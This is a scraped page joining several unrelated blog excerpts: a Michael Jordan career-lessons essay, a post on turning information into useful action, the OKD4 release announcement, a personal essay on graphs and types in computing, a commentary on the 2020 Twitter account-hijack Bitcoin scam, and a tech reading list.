<p>There’s just so much emotions, energy, and heart placed into this game. From the story of him being cut from his high school basketball team that hurt him over the summer. He decided to pour his heart and do his absolute best to get back onto the team. It has been 7 years since he entered NBA and to finally be able to reach to the top through the many years. Even as Michael cried holding that trophy, there was just so much passion and emotions put into whatever he did.</p>
<br>
<blockquote>
<p>”I’ve been waiting seven years for this and I thank God for blessing us to make it possible,”</p>
<p>”This is the happiest moment of my life,” Jordan said. “We did it. We did it as a team. I’ve been fighting to hold back my emotions all week. But I knew we would win it tonight and I knew my emotions would get the best of me. I’m just happy.”<br>
Jordan said.</p>
</blockquote>
<br>
<blockquote>
<p>Heart is what separates the great from the good.</p>
</blockquote>
<p>Interestingly, I do see parallel behaviors among the giants even in the technology scene as well. We can see that from the life of Steve Jobs. Here’s an article that briefly talked about his stroy.</p>
<p><a ref="nofollow" target="_blank" href="https://arstechnica.com/gadgets/2011/11/why-steve-jobs-cried/">Why Steve Jobs cried</a></p>

<p>The main point isn’t to cry over every thing that happened but to talk about that deep sense of passion and heart in what you do. I guess such a level of passion in any tasks or goal speaks more of the dedication that person has as an individual than about the seriousness of the task.</p>

<p>If you want to excel into any industry, you got to have that passion that pushes you beyond the boundaries to explore what could be beyond this limit. This is all the more true in the technology industry where all these technologies advancing with new updates or releases. In order to keep up, you got to have that sense of curiosity to find out what the industry has done to solve all the different problems you have. Only when you have that sense of curiosity then can you want to go out there to find out what are these technology giants doing. Let me give you an illustration:</p>

<p>Here’s a <a ref="nofollow" target="_blank" href="https://roadmap.sh/devops">Roadmap for devops engineer</a>. It basically charts out for you the set of learnings or knowledge you should know or master if you ever chooses to walk down this path of being a devOps engineer.</p>

<p><strong>Just look at the amount of technology in one single page</strong>. And each box properly takes an individual years to master, and some even pursue just one box their entire career. If you did not have any interest or deep passion for the tools out there, you will probably just ignore most of that because you could just make do with the tools you already know to ‘hack’ your way to a solution.</p>

<p>The successful techies are not always the oldest, but more often than not, you find in these people a deep sense of curiosity and passion for the technology. The way they describe technology almost always sound like they are describing a friend you have to got to know on a daily basis. And one day, I aspire to be like one of them as well (:</p>
<br>
<h2>3. Focused on what he wants to do. And actually go get it</h2>

<p>One common trait among all great players or individuals that we know of, Warran buffet, Steve jobs, and Michael Jordan: They had laser sharp focus on what they want to do.</p>

<p>The focus to improve is not found on the court. What you see on the court in public’s view was merely the outcome of the grind behind closed doors in the gym. The focus to improve starts in the gym behind closed doors and far from media. He made sure to practice harder than that he played. That intensity of personal practice allowed him to create that familiarity and comfort zone during game time, and all he had to do was the react to what his body was already accustomed to do. He focused on getting his fundamentals right. Focused to perfect the small things that noone seem to notice. People only saw the outcome of that focus to little details.</p>
<br>
<blockquote>
<p>Doing the little things until perfection becomes a habit</p>
</blockquote>

<p>
<iframe src="https://www.youtube.com/embed/9zSVu76AX3I" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p>

<p>Many times people chase after the shiniest objects in the technology space - AI, Automation, Machine Learning. In the act of chasing, people lose sight of the fundamentals - understanding the business problem or creating product and services that business actually need or even simply just focusing on writing clean, testable, and readable code. While articles about AI and Machine learning may create some wows, it is the seemingly dull and ‘boring’ habits of consistently writing code, learning about good coding practices that sharpens your fundamentals. When it is crunch time, you will find yourself well equipped to shine in your work. These little act of grinding can be attending online courses to learn more about courses that does hands-on projects with you.</p>

<p>One such course is <a ref="nofollow" target="_blank" href="https://pluralsight.com/">Plural sight</a>. They have really detailed courses with instructors that will guide you through the fundamentals of what you are learning, impart the best practices and share their learning in a walkthrough guide that you can do alongside them. Another will be udemy. Check those out.</p>
<br>
<blockquote>
<p>When you practice daily and deliberately, you will find yourself ready when the next challenge or problem comes your way.</p>
</blockquote>
<br>
<h2>4. Together we can do more: he has a close group of people to keep him grounded</h2>

<p>People do not usually see this aspect of him when we hear of the great Michael Jordan. Many instances, I’ve noticed from all the videos, he always had the support of his parents and siblings when he hits rock bottom. Even during the first championship, his dad was present there alongside him. And was also there to deal with backlashes about MJ’s gambling habits.</p>

<p>Imagine the devastation to know that your strong support was taken away just like that.</p>

<p>
<iframe src="https://www.youtube.com/embed/GG5xXWHyq9g" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p>

<p>If you want to go far, you have to go together as a team. Over the years, I’ve came to understand that if we want to solve problems that are bigger than ourselves - societal issues, you have to have a team alongside you. You have your strength to offer to the table, but rarely do we see how our strengths alone is able to bring a holistic solution. Yes, you may be an amazing god-like engineer that can replicate another google. Even with all the knowledge in the world, you lack the one resource you cannot buy - time. Everyone of us needs one another. In technology, the ability to come together with our different skills and collaborate opens up door of opportunities.</p>
<br>
<h2>5. Know how to respond to failure: failure is the only way to success</h2>

<p>Michael Jordan did not fear the spot light. He did not shy away from the crunch time. When it was time for the bulls team to take the final score, it goes to him without a question. But that illusion of ‘success since birth’ did not start that way. He was not always a winner. There is this famous quote from him:</p>
<br>
<blockquote>
<p>“I’ve missed more than 9000 shots in my career. I’ve lost almost 300 games. 26 times, I’ve been trusted to take the game winning shot and missed. I’ve failed over and over and over again in my life. And that is why I succeed.”</p>
</blockquote>

<p>
<iframe src="https://www.youtube.com/embed/JA7G7AV-LT8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p>

<p>It is always easy to make sense of all these failures on hindsight - this is called the hindsight bias, where the decisions and circumstances you faced seems like an invisible ink before the good outcome, but plain as day after the outcome as if a fool would have missed it.</p>

<p>Similarly in technology, as you start off, you will find yourself deep into the unknown; overwhelmed with unfamiliarity regarding the technology you have to deal with in order to deliver the solution. You make mistakes in your earlier days and thus causing scalability issues when the solution starts to scale to hundreds of people. Since that feature is implemented by you, these mistakes and bugs are starting to …</p></span></p></div></div>

			<p>We have had the information stage. You could argue we are now in a curation stage. Or maybe an <a href="https://www.forbes.com/sites/quora/2019/01/16/what-will-come-after-the-information-age/#769187363d7d">‘age of reckoning’</a> where technology needs to step up and prove it’s worth. But what if we entered an entirely new stage? One that leads to the act of connecting the knowing with the doing. We could call it an ‘age of usefulness’. In this age we possess knowledge but the change will come from translating it into something useful. I’m not the first to use the label ‘Useful Knowledge’, I discovered there was a <a href="https://en.wikipedia.org/wiki/Society_for_the_Diffusion_of_Useful_Knowledge">‘Society for the Diffusion of Useful Knowledge’ that was founded in 1826 with the objective of publishing information to people who were unable to obtain formal education</a>. Our objective is slightly different but it serves a similar purpose. Make information more useful to the average person. To reframe the objective for 2020, how do we turn our world overflowing with information and stamped with likes and shares, into useful knowledge and actions for anyone?</p>
<h4>Curation and the Slow Web</h4>
<p>There are lots of apps and sites trying to curate – <a href="https://getpocket.com/">Pocket</a> news apps like <a href="https://flipboard.com/">FlipBoard, </a>Apple News, or <a href="https://www.are.na/">Are.na.</a> Some of these get the users to curate which makes sense. It’s logical to take all the information which is flooding our senses and try to filter the signal from the noise. These curation based apps are a welcome attempt to try and help us find the best content for us. Yet in our quest for to transform information to useful action, it still doesn’t get us much further in our objective. We continue to skim and like and share. It’s just a bit more relevant.</p>
<p>Is it a return of a slower mode of internet? <a href="https://pando.com/2020/07/13/return-slow-web-movement/">I like the ethos of a ‘slow web’ as described here with some examples.</a> It takes us back to a steady pace where we can take the time over consumption of content. An opportunity to halt the endless scrolling and trolling. However, the downside is it looks and feels a bit like regression. While they are wonderfully simple sites, sometimes they look like we just stepped back into the 90’s. It’s a struggle to know how to get started. This may be down to user ignorance because we are so accustomed to the mechanism of the social feed. Or it could be the fact that gossip and clickbait are addictive. For all its controversies, Facebook and Twitter made it easy for people to get going. The challenge with the ‘slow web’ may be the difficulty to get into a rhythm of this new mode of consumption, leading to a natural hesitation to dive in and engage.</p>
<h4>Maybe It’s Time for Something Different?</h4>
<p>It’s overdue that we try to create something more useful. We need to make the most of all the information we have available and take it to a natural next stage of evolution.</p>
<p>We could dream a little. Imagine a newly designed social platform that provides content. On this new platform, instead of a passive like, the user indicates something useful like intention. Intention that will encourage the user to do an action related to the content and let the provider of the content know that the user is interested. From this the user is guided to the next useful step. This may involve signing up, adding to a task list, sending an e-mail or anything that would logically follow as an action from the content.</p>
<p>This proposal isn’t exactly new. We have seen it before with the capture of intent via assistants or intelligence built in but somehow we seem to have missed a step. For instance, an assistant will try to do something for you if you ask for it. Sometimes proactively by trying to predict ahead and make suggestions. Although this approach sometimes it gets it right, other times it gets it so very wrong. The missing step is the connection between consuming the knowledge and then signaling your intention to move ahead with action. All too often, the assistant or system will try to calculate intention too soon when all that is needed is an initial nudge or nod that you want to take the next step. We’re trying to go from knowledge to doing too quickly and usefulness can be lost in translation.</p>
<h4>From Knowing to Doing</h4>
<p>The path from knowing about something to doing is full of obstacles and rarely straightforward.</p>
<p>We are very good at consuming content like information, data, and knowledge. We’re experts at searching and locating the content we need. However, linking action to that knowledge is not so easy for us. To do something on the basis of knowledge is essential if we want to have our new found knowledge make a difference. We can choose to take the advice of the writer, influencer, organization or we can let it capture our attention for a minute, move swiftly on and forget we even saw it. We’re none the wiser.</p>
<p>In the <a href="https://recknsense.com/recknwho/">‘Who Else’ section of Recknsense</a>, I’m running an experiment to understand the connection between content and action. I post up content I have read or watched. These could be YouTube videos, films, TV, documentaries, Vistas, books, magazines or articles – anything I’m interested in. I invite others to vote to say yes they’ve seen the content too or if they haven’t, no but they intend to. I want to see if this connects the information to some kind of action. Eventually this could go to the next stage by saving the intentions for the user to act on at a future date or prompting with next steps. As a bonus for me, I get to see who else has the same interests.</p>
<p>Time will tell what results my experiment yields. In the mean time, I can enjoy the fact that I can control and curate my own content, I’m free from fast and fickle feeds, and best of all, I hope sincerely that some of it may turn out useful for you.</p>

<h2>Announcing the General Availability of OKD4</h2>
<p>Today, the OKD-WG is pleased to announce the General Availability of OKD4, the community distribution of Red Hat OpenShift Kubernetes platform. With today’s GA release of OKD4, Red Hat continues its commitment to open source and open collaboration with the Kubernetes and other Cloud Native communities.</p>

<h2>OKD’s Origins</h2>
<p>In April 2012, Red Hat first released Origin as the open source upstream project of OpenShift. We had little inkling of the phenomenal trajectory of cloud-native technology that was to come. From the rise of containers, the birth of OCI and Fedora CoreOS, and now the <a href="https://www.openshift.com/blog/operator-framework-moves-to-cncf-for-incubation" rel=" noopener">CNCF’s incubation of Operator Framework</a>, it has been an amazing ride. OKD4 wouldn’t be possible without all these incredible innovative technologies and their communities.</p>
<p>During the 3.x release timeframe, OKD has been a stable basis for OpenShift Container Platform, acting as an upstream distribution based on community-driven components - CentOS and Project Atomic to name a few. With the advent of the <a href="https://www.redhat.com/en/blog/introducing-red-hat-universal-base-image">Universal Base Image,</a> relations between OKD and OCP has changed - from "upstream-downstream" to what we call "sibling distributions." Images are built using RHEL7 base and can be distributed simultaneously for OKD and OCP, with no rebuild necessary. This enables both distributions to get updated code earlier, including security fixes from RHEL7, and provides a stable base for Red Hat Enterprise Linux.</p>
<p>OpenShift 4.x heavily focuses on high availability, observability and seamless upgrades. With the OKD 4 release, the community is not only getting easy access to these features, but also the ability to affect the direction of the platform (via <a href="https://github.com/openshift/enhancements/">enhancements process</a>) and a community space for experimentation, discussion and knowledge sharing. The Operators pattern used throughout the design of OKD 4 is allowing users to maintain clusters efficiently over their lifetime.</p>
<h2>Release Highlights</h2>
<p>OKD4 uses <a href="https://youtu.be/JepNm7R0LSo">Fedora CoreOS</a> as a base OS for the nodes. It enables the cluster with recent security fixes, new features (like cgroups v2 support) and updated software. OKD4 is using the same images as the corresponding OpenShift Container Platform release. As a result, the community can participate in the development and can modify any part of the cluster in order to achieve specific goals.</p>
<p>The cluster still has the same features as in OKD3 - it can be installed in the user environment, configured to user liking and updated.</p>
<hr>
<h2>How it differs from OCP</h2>
<p>Unlike OCP there are several distinctive features in OKD4:</p>
<p>As a community distribution it does not require a pull secret from <a href="https://openshift.com/try">https://openshift.com/try</a>. All OKD4 images are available without additional authentication. The base OS image for OKD4 is available at <a href="https://getfedora.org/en/coreos/download/">https://getfedora.org/en/coreos/download/</a>. However some optional operators from <a href="https://operatorhub.io/" rel=" noopener">operatorhub.io</a> require a pull secret, so by default OKD4 installs a source with community operators only. See <a href="https://github.com/openshift/okd/blob/master/FAQ.md#how-can-i-enable-the-non-community-red-hat-operators">FAQ</a> for more information.</p>
<p>OCP is an opinionated Kubernetes distribution with a heavy focus on high availability and production workloads. This puts restrictions on cluster configuration - for instance, single master installations are not supported. OKD4, however, allows users to install single master clusters - for development or stage environments. These clusters cannot be upgraded to later versions, though.</p>
<p>OKD4 creates a new nightly release after OCP tests are completed by our CI system. Every two weeks we'll promote a nightly to a stable release stream, so users can get updates to latest and tested code without switching channels.</p>
<hr>
<h2>Getting Started</h2>
<p>Installing OKD4 is as easy as OCP4 - see <a href="https://github.com/openshift/okd#getting-started">Getting Started</a> for instructions.</p>
<p>OKD-specific documentation is available at <a href="https://docs.okd.io/">docs.okd.io</a></p>

  <p><span>30 Jun 2020</span></p><p>Research has begun to reveal many algorithms can be expressed as matrix multiplication, suggesting an unrealized connection between linear algebra and computer science. I speculate graphs are the missing piece of the puzzle. Graphs are not only useful as cognitive aides, but are suitable data structures for a wide variety of tasks, particularly on modern parallel processing hardware.</p>

<p>In this essay, I explore the virtues of graphs, algebra, types, and show how these concepts can help us reason about programs. I propose a computational primitive based on graph signal processing, linking software engineering, graphs, and linear algebra. Finally, I share my predictions for the path ahead, which I consider to be the start of an exciting new chapter in computing history.</p>

<p><em>n.b.: None of these ideas are mine alone. Shoulders of giants. Follow the links and use landscape mode for optimal reading experience.</em></p>



<p>Over the last decade, I bet on some strange ideas. A lot of people I looked up to at the time laughed at me. I’ll bet they aren’t laughing anymore. I ought to thank them one day, because their laughter gave me a lot of motivation. I’ve said some idiotic things to be sure, but I’ve also made some laughable predictions that were correct. Lesson learned: aim straighter.</p>

<p>In 2012, I was in Austin sitting next to an ex-poker player named <a href="https://twitter.com/amirpc">Amir</a> who was singing Hinton’s praises. Hypnotized by his technicolor slides, I quit my job in a hurry and started an educational project using speech recognition and restricted Boltzmann machines. It never panned out, but I learned a lot about ASR and Android audio. Still love <a href="http://breandan.net/2014/02/09/the-end-of-illiteracy/">that idea</a>.</p>

<p>In 2017, I started writing a book on the ethics of automation and <a href="http://breandan.net/2017/02/02/trust-in-automation/">predicted</a> mass unemployment and social unrest. Although I got the causes wrong (pandemic, go figure), the information economy and confirmation bias takes were all dead right. Sadly, this is now driving the world completely insane. Don’t say I warned you, go out and fix our broken systems. The world needs more engineers who care.</p>

<p>In 2017, I witnessed the birth of <a href="https://colah.github.io/posts/2015-09-NN-Types-FP/">differentiable programming</a>, which I stole from Chris Olah and turned into a <a href="https://github.com/breandan/kotlingrad/blob/master/latex/thesis/thesis.pdf">master’s thesis</a>. Had a lot of trouble convincing people that classical programs could be made differentiable, but look at the proceedings of any machine learning conference today and you’ll find dozens of papers on differentiable sorting and rendering and simulation. Don’t thank me, thank Chris and the Theano guys.</p>

<p>In 2018, I correctly predicted Microsoft would acquire GitHub to mine code. Why MS and not Google? I’ll bet they tried, but Google’s leadership had fantasies of AGI and besides JetBrains, MS were the only ones who gave a damn about developers. Now ML4SE is a thriving <a href="https://ml4se.github.io/">research area</a> and showing up in <a href="https://github.com/JetBrains-Research/DeepBugsPlugin">real</a> <a href="https://devblogs.microsoft.com/visualstudio/ai-assisted-intellisense-for-your-teams-codebase/">products</a>, much to the chagrin of those who believed ML was a fad. I suspect their hype filter blinded them to the value those tools provide.</p>

<blockquote><p lang="en" dir="ltr">Prediction: MS will acquire GH within five years. If the <a href="https://twitter.com/hashtag/ML4Code?src=hash&amp;ref_src=twsrc%5Etfw">#ML4Code</a> stuff delivers for MS, acquisition is highly likely. Although it would have been cheaper a few years ago. <a href="https://t.co/5ZMtiRtifD">https://t.co/5ZMtiRtifD</a> <a href="https://t.co/TaxkArm5ps">https://t.co/TaxkArm5ps</a></p>— breandan (@breandan) <a href="https://twitter.com/breandan/status/993553301927936001?ref_src=twsrc%5Etfw">May 7, 2018</a></blockquote>

<p>But to heck with everything I’ve said! If I had just one idea to share with these ML people, it would be types. Beat that drum as loud as I could. Types are the best tool we know for synthetic reasoning. If you want to build provably correct systems that scale on real-world applications, use types. Not everyone is convinced yet, but mark my words, <a href="https://github.com/tensorflow/tensorflow/issues/12345">types</a> are <a href="https://docs.python.org/3.9/whatsnew/3.9.html#pep-585-builtin-generic-types">coming</a>. Whoever figures out how to connect types and learning will be the next Barbara Liskov or Frances Allen.</p>

<p>This year, I predicted the pandemic weeks before the lockdown, exited the market, and turned down a job at Google. Some people called me crazy. Now I’m going all-in on some new ideas (none of which are mine). I’m making some big bets and some will be wrong, but I see the very same spark of genius in them.</p>



<p>As a kid, I was given a book on the history of mathematics. I remember it had some interesting puzzles, including one with <a href="https://en.wikipedia.org/wiki/Seven_Bridges_of_K%C3%B6nigsberg">some bridges</a> in a town divided by rivers, once inhabited by a man called Euler. Was there a tour crossing each bridge exactly once? Was it possible to tell without checking every path? I remember spending days trying to figure out the answer.</p>

<p>In the late 90s, my mom and I went to Ireland. I remember visiting Trinity College, and learning about a mathematician called <a href="https://en.wikipedia.org/wiki/William_Rowan_Hamilton">Hamilton</a> who discovered a famous formula connecting algebra and geometry, and carved it onto a <a href="https://en.wikipedia.org/wiki/Broom_Bridge">bridge</a>. We later visited the bridge, and the tour guide pointed out the stone, which we touched for good luck. The Irish have a <a href="https://en.wikipedia.org/wiki/Poulnabrone_dolmen">thing</a> for <a href="https://en.wikipedia.org/wiki/Newgrange">stones</a>.</p>

<p>In 2007, I was applying to college and took the train from Boston to South Bend, Indiana, home of the Fighting Irish. Wandering about, I picked up a magazine article by a Hungarian mathematician called <a href="https://en.wikipedia.org/wiki/Albert-L%C3%A1szl%C3%B3_Barab%C3%A1si">Barabási</a> then at Notre Dame, who had some interesting things to say about <a href="https://en.wikipedia.org/wiki/Complex_network">complex networks</a>. Later in 2009, while studying in Rochester, I <a href="http://breandan.net/images/complex_network_seminar.png">carpooled</a> with a <a href="https://avesis.medeniyet.edu.tr/hasan.guclu">nice professor</a>, and learned complex networks are found in brains, languages and many marvelous places.</p>

<p>Fast forward to 2017. I was lured by the siren song of algorithmic differentiation. Olivier Breleux presented <a href="https://github.com/mila-iqia/myia">Myia</a> and <a href="https://github.com/breuleux/buche">Buche</a>. Matt Johnson gave a talk on <a href="https://github.com/HIPS/autograd">Autograd</a>. I met Chris Olah in Long Beach, who gave me the idea to study <a href="https://colah.github.io/posts/2015-09-NN-Types-FP/">differentiable programming</a>. I stole his idea, dressed it up in Kotlin and traded it for a POPL workshop paper and later a <a href="https://github.com/breandan/kotlingrad/blob/master/latex/thesis/thesis.pdf">Master’s thesis</a>. Our contributions were using algebra, shape inference and presenting AD as term rewriting.</p>

<p>In 2019, I joined a lab with a <a href="https://www.cs.mcgill.ca/~jguo/">nice professor</a> at McGill applying knowledge graphs to software engineering. Like logical reasoning, knowledge graphs are an idea from the first wave of AI in the 1960s and 70s which have been revived and studied in light of recent progress in the field. I believe this is an important area of research with a lot of potential. Knowledge and traceability plays a big role in software engineering, and it’s the bread-and-butter of a good IDE. The world needs better IDEs if we’re ever going to untangle this mess we’re in.</p>

<p>This Spring, I took a fascinating seminar on <a href="https://cs.mcgill.ca/~wlh/comp766/index.html">Graph Representation Learning</a>. A lot of delightful graph theory has been worked out over the last decade. <a href="https://en.wikipedia.org/wiki/PageRank">PageRank</a> turned into power iteration. People have discovered many interesting connections to linear algebra, including Weisfeiler-Lehman graph kernels, graph Laplacians, Krylov methods, and spectral graph theory. These ideas have deepened our understanding of graph signal processing and its applications for learning and program analysis. More on that <a href="#graphs-computationally">later</a>.</p>



<p>Graphs are general-purpose data structures used to represent a variety of data types and procedural phenomena. Unlike most sequential languages, graphs are capable of expressing a much richer family of relations between entities, and are a natural fit for many problems in computer science, physics, biology and mathematics. Consider the following hierarchy of data structures, all of which are graphs with increasing expressive power:</p>

<ul>
  <li><strong>Sets</strong>: datasets, multisets, posets, alphabets</li>
  <li><strong>Sequences</strong>: Lists, strings, arrays, linear function composition</li>
  <li><strong>Trees</strong>: <a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">Abstract syntax</a>, <a href="https://en.wikipedia.org/wiki/Document_Object_Model">XML</a>, <a href="https://en.wikipedia.org/wiki/Phylogenetic_tree">phylogeny</a>, <a href="https://en.wikipedia.org/wiki/Decision_tree">decision trees</a></li>
  <li><strong>DAGs</strong>: <a href="https://eagain.net/articles/git-for-computer-scientists/">Git</a>, <a href="https://en.wikipedia.org/wiki/Citation_network">citations</a>, <a href="https://en.wikipedia.org/wiki/Dependency_graph">dependency graphs</a>, <a href="https://en.wikipedia.org/wiki/Workflow_management_system">workflows</a>, <a href="https://en.wikipedia.org/wiki/Control-flow_graph">control flow</a>, <a href="https://en.wikipedia.org/wiki/Multilayer_perceptron">MLPs</a></li>

  <li><strong>Hypergraphs</strong>: <a href="https://arxiv.org/pdf/2003.02320.pdf">Knowledge</a>, <a href="https://zettelkasten.de/">Zettelkasten</a>, <a href="https://en.wikipedia.org/wiki/Category_theory">categories</a>, <a href="https://writings.stephenwolfram.com/2020/04/finally-we-may-have-a-path-to-the-fundamental-theory-of-physics-and-its-beautiful/">physics</a>, <a href="https://openreview.net/pdf?id=rkpACe1lx">hypernetworks</a></li>
</ul>

<p>As we realized in <a href="https://github.com/breandan/kotlingrad">Kotlin∇</a>, directed graphs can be used to model mathematical expressions, as well as other formal languages, including source code, intermediate representations and binary artifacts. Not only can graphs be used to describe extant human knowledge, many recent examples have shown that machines can “grow” trees and graphs for various applications, such as program synthesis, mathematical deduction and physical simulation. Recent neuro-symbolic applications have shown promising early results in graph synthesis:</p>

  <li><a href="https://arxiv.org/pdf/2005.11212.pdf">Symbolic Pregression: Discovering Physical Laws from Raw Distorted Video</a> (Udrescu &amp; Tegmark, 2020).</li>

  <li><a href="https://arxiv.org/pdf/1910.10593.pdf">Neural Execution of Graph Algorithms</a>, Veličković et al. (2020)</li>
</ul>

<p>The field of natural language processing has also developed a rich set of graph-based representations, such as <a href="https://en.wikipedia.org/wiki/Phrase_structure_grammar">constituency</a>, <a href="https://en.wikipedia.org/wiki/Dependency_grammar">dependency</a>, <a href="https://en.wikipedia.org/wiki/Link_grammar">link</a> and other and other typed attribute grammars which can be used to reason about syntactic and semantic relations between natural language entities. Research has begun to show many practical applications for such grammars in the extraction and organization of human knowledge stored in large text corpora. Those graphs can be further processed into ontologies for logical reasoning.</p>

<p>Using coreference resolution and entity alignment techniques, we can reconstruct internally consistent relations between entities, which capture cross-corpus consensus in natural language datasets. When stored in <a href="https://arxiv.org/pdf/2003.02320.pdf">knowledge graphs</a>, these relations can be used for information retrieval and question answering, e.g. on wikis and other content management systems. Recent techniques have shown promise in automatic knowledge base construction (cf. <a href="https://www.mitpressjournals.org/doi/pdf/10.1162/tacl_a_00088">Reddy et al.</a>, 2016).</p>

<p>Lo and behold, the key idea behind knowledge graphs is our old friend, types. Knowledge graphs are multi-relational graphs whose nodes and edges possess a type. Two entities can be related by multiple types, and each type can relate many pairs of entities. We can index an entity based on its type for knowledge retrieval, and use …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-2248">

	<div>
		<p>Today I was reminded of the first post I ever wrote on this blog (<a href="https://unintendedconsequenc.es/voice-ai-telecom-scams-and-co-evolution/">Voice AI, Telecom, Scams, and Co-evolution</a>), back in 2018. My first article was focused on second-order effects of emerging voice AI capabilities and projected a number of scams that the technology would enable.</p>
<p>While this tech also has many positives, I always try to get a fuller picture by looking at the system.</p>
<p>The world is full of trade offs. In the case of voice AI in the article, we have the ability to scale up scams that historically worked, but only in small does. The “hey grandma” scam was one example. As I wrote <a href="https://unintendedconsequenc.es/voice-ai-telecom-scams-and-co-evolution/">back then</a>:</p>
<blockquote><p>“An older scam that this tech will scale is what’s known as the “<a href="https://www.womansday.com/life/a58837/hey-grandma-scam/">Hey, Grandma</a>” scam, where a grandparent gets a call from a “grandchild” in distress. There are different flavors of this. For US grandparents the story is often that the grandchild got into legal trouble and needs money wired. In China and Taiwan, it’s often that the grandchild has been kidnapped and is being beaten up. Again, wire the money.”</p></blockquote>
<p>It doesn’t matter that most don’t fall for the scam. In cases like these where you can take a process of theft that formerly needed a human thief to target people one by one, by automating the process, you can benefit from scale effects. That is, it doesn’t matter that only a tiny fraction of people fall for the scam as long as you can spread it around broadly enough and not use up all of your time doing it.</p>
<p>Today a different scam played out on Twitter. Multiple well-known accounts (Bill Gates, Elon Musk, Mike Bloomberg, Jeff Bezos, and more) were hacked. Their pinned tweets became versions of this message. (I blocked part of the address so I wouldn’t be distributing this even further.)</p>
<p><img src="https://unintendedconsequenc.es/wp-content/uploads/2020/07/Hacked-Bill-and-Elon-300x122.png" alt="" width="550" height="223" srcset="https://unintendedconsequenc.es/wp-content/uploads/2020/07/Hacked-Bill-and-Elon-300x122.png 300w, https://unintendedconsequenc.es/wp-content/uploads/2020/07/Hacked-Bill-and-Elon-768x312.png 768w, https://unintendedconsequenc.es/wp-content/uploads/2020/07/Hacked-Bill-and-Elon-1024x416.png 1024w" sizes="(max-width: 550px) 100vw, 550px"></p>
<p>The messages on the hacked accounts were up for a couple hours — quite a while in online terms for such large accounts. Only Twitter really knows how many people saw the tweets, but it’s roughly:</p>
<p><em>the total number of followers of the accounts (perhaps close to 100 million) + the number of people Twitter showed the retweets (people retweeted out of both belief and irony) x the percent of people who happened to be on Twitter for those couple hours x the percent of people who believed the messages x the percent who had Bitcoin…</em></p>
<p>What’s more, these messages apparently resulted in around $60,000 of Bitcoin transferred to the scammer’s account, which was then transferred elsewhere.</p>
<p>Another way to think about this is that even by taking over all of those large follower accounts, the scam only managed to affect around 300 people and $60,000. There are much bigger scams that we never hear about. I can’t help but think that this scam in particular seemed like a bigger deal because the scammers took over what is in effect a public discourse channel that these large accounts use.</p>
<p>Like any large-scale sudden unexpected news, it led to a lot of contemplation. One of the most interesting critiques I saw was this one.</p>
<p><img src="https://unintendedconsequenc.es/wp-content/uploads/2020/07/Hacked-Twitter-idea-300x232.png" alt="" width="550" height="426" srcset="https://unintendedconsequenc.es/wp-content/uploads/2020/07/Hacked-Twitter-idea-300x232.png 300w, https://unintendedconsequenc.es/wp-content/uploads/2020/07/Hacked-Twitter-idea-768x594.png 768w, https://unintendedconsequenc.es/wp-content/uploads/2020/07/Hacked-Twitter-idea.png 941w" sizes="(max-width: 550px) 100vw, 550px"></p>
<p>It’s a good question, why indeed is this the best that somebody could do. But we’re probably overthinking this. This seems to be a hit and run, not anything grander. But it has certainly made me (and I’m sure others) think about what exposure we have to Twitter and other user-generated content (UGC) networks.</p>
<p>Others came along to warn people away from the scam. While the scam propagated fast, it was also interesting to see just how fast users on the network helped prevent damage. Someone actually registered a <a href="https://bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh.com/">domain name</a> with the scammer’s address just to show this message.</p>
<p><a href="https://bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh.com/"><img src="https://unintendedconsequenc.es/wp-content/uploads/2020/07/Hacked-dont-send-Bitcoin-300x83.png" alt="" width="550" height="152" srcset="https://unintendedconsequenc.es/wp-content/uploads/2020/07/Hacked-dont-send-Bitcoin-300x83.png 300w, https://unintendedconsequenc.es/wp-content/uploads/2020/07/Hacked-dont-send-Bitcoin-768x213.png 768w, https://unintendedconsequenc.es/wp-content/uploads/2020/07/Hacked-dont-send-Bitcoin-1024x283.png 1024w, https://unintendedconsequenc.es/wp-content/uploads/2020/07/Hacked-dont-send-Bitcoin.png 1481w" sizes="(max-width: 550px) 100vw, 550px"></a></p>
<p>In an older time, people wondered about <a href="https://en.wikipedia.org/wiki/Broadcast_signal_intrusion"><strong>broadcast signal intrusion</strong></a> — in other words, taking over the airwaves — to broadcast a diabolical message to a helpless population who only have access to three TV channels. Those villains, both real and fictional, did this to intimidate or brag, not to steal.</p>
<p>But back to the Twitter accounts hack. Rather than steal $60K, imagine if the scammers set their sights higher. Wouldn’t it be much better to try to persuade a large audience? <strong>Imagine doing this on election day.</strong></p>

What are you reading today? What have you learnt today that you did not know previously.</p>

<p>In today’s article, its a curation of the articles i’ve read on the second half of June! The articles are classified to the few topics:</p>
<br>
<h2>Topics covered</h2>
<ul>
<li>General Technology and resources for video call</li>
<li>Security</li>
<li>General</li>
<li>Design patterns</li>
<li>Management for tech</li>

<p>Software reuseability does not always allow you to copy code wholesale to be placed into another. It requires you to make tweaks and alterations to get it to work as intended in another application. It’s more of an organ transplant than a lego brick. An accurate illustration to share a point! (:</p>

<p><a ref="nofollow" target="_blank" href="https://fly.io/blog/how-cdns-generate-certificates/">How CDNs generate certificate</a></p>

<p><a ref="nofollow" target="_blank" href="http://fly.io/">fly.io</a>’s article is really interesting. It goes into the mechanics of how certifications are issued, and how does Let’s Encrypt verify your domain belongs to you. That is through the ACME protocol of course. Interstingly, they do provide free tier k8s services at $10/mth equivalent of paid services. Thats super decent. They seek to be competitive with the bigger players such as Google Cloud , Amazon Web Service and Azure.</p>

<p>If you heard about ansible, it seeks to serve the same role - configuration management. Maybe a good alternative to ansible if it has different dependences that VMs may not have for ansible.</p>

<p>Saw this and its interesting to see hacker news stream in a different format. It would be nice to have a refresh button instead of a manual refresh to get updates.</p>

<p><a ref="nofollow" target="_blank" href="https://regexone.com/">learning regex</a></p>

<p>This website allows you to learn regex with good explanations with exercises that allows you to get your hands dirty. Being an advocate of learn by doing.  I really like how learning has been made easier for people to pick up a skill in bite sizes. No we should not spoon feed people but neither do we give a medium rare steak to a baby. Everything requires a progress and a series of steps to learn the essential skills before proceeding to a higher level competency. Personally, this is a good example of what seems like a lightweight and highly reusable static site for learning a new skill. Definitely a reference for my next pet projects.</p>

